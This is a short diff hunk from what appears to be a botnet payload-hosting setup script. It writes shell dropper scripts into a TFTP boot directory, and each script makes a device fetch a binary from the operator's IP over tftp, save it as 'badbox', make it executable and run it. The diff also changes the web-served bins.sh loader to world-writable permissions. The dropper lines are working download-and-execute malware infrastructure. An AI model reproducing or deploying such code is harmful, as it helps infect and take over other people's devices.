@@ -130,7 +130,7 @@ for arch in rust_archs:
     run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
     run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
 
-run("chmod +x /var/www/html/bins.sh")
+run("chmod 777 /var/www/html/bins.sh")
 
 
 run("service xinetd restart")
